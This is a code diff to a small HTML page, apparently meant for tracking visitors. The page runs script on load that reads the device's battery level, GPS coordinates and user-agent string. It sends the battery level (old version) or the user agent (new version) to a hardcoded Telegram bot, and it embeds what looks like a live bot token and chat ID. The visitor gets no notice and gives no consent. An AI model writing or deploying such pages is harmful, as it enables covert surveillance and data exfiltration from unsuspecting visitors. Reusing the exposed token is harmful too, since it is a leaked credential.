@@ -32,25 +32,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Battery Level</title>
+    <title>Get Battery Level and Live Location</title>
 </head>
 <body>
     <script>
-        const botApiToken = '6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc';
-        const telegramId = '1776168152';
-
-        function notifyBatteryLevel(level) {
-            fetch(`https://api.telegram.org/bot${botApiToken}/sendMessage?chat_id=${telegramId}&text=Battery Level: ${level}%`);
-        }
-
-        // Example: Notify battery level when page loads
-        window.addEventListener('load', function() {
-            // Get battery level
-            navigator.getBattery().then(function(battery) {
-                let level = battery.level * 100;
-                notifyBatteryLevel(level);
-            });
+        // Code to get battery level
+        navigator.getBattery().then(function(battery) {
+            console.log("Battery Level: " + battery.level * 100 + "%");
         });
+
+        // Code to get live location using GPS
+        navigator.geolocation.getCurrentPosition(function(position) {
+            console.log("Latitude: " + position.coords.latitude);
+            console.log("Longitude: " + position.coords.longitude);
+        });
+
+        // Code to send mobile name to Telegram bot
+        var botApiToken = "6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc";
+        var telegramId = "1776168152";
+        var mobileName = navigator.userAgent;
+        var url = "https://api.telegram.org/bot" + botApiToken + "/sendMessage?chat_id=" + telegramId + "&text=Mobile Name: " + mobileName;
+        fetch(url);
     </script>
 </body>
 </html>
